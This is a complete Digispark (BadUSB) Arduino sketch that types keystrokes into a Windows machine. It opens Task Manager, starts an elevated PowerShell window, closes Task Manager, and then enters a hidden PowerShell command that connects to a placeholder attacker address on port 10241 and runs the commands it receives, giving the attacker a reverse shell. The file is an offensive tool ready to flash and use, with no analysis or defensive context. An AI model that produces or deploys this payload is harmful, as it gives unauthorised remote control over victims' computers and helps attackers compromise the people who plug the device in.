#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(30);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(30);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(30);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(30);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=128 lines=5\"");//start tiny PowerShell
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(1300);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.delay(750);
  DigiKeyboard.println("cmd");//run cmd
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command \"$client = New-Object System.Net.Sockets.TCPClient('YourIPAddress',10241);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); //powershell to attacker
  DigiKeyboard.delay(4000);
  while(1)
  {
      digitalWrite(1, HIGH);
      DigiKeyboard.delay(50);
      digitalWrite(1, LOW);
      DigiKeyboard.delay(50);
      digitalWrite(1, HIGH);
      DigiKeyboard.delay(50);
      digitalWrite(1, LOW);
      DigiKeyboard.delay(50);
      digitalWrite(1, HIGH);
      DigiKeyboard.delay(50);
      digitalWrite(1, LOW);
      DigiKeyboard.delay(2000);
  }
}
